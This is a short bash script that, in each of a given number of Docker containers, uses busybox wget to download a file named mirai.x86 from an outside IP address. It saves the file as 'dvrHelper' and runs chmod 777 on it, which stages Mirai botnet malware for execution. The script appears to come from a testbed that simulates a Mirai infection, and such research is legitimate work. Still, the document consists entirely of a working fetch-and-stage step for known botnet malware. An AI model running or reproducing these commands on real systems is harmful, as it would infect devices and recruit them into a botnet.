#!/bin/bash
AUX=$(($1 + 0))

for i in $(seq 1 $AUX)
do
	docker exec -w / -i bb$i sh -c "/bin/busybox wget http://216.58.202.229/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
done
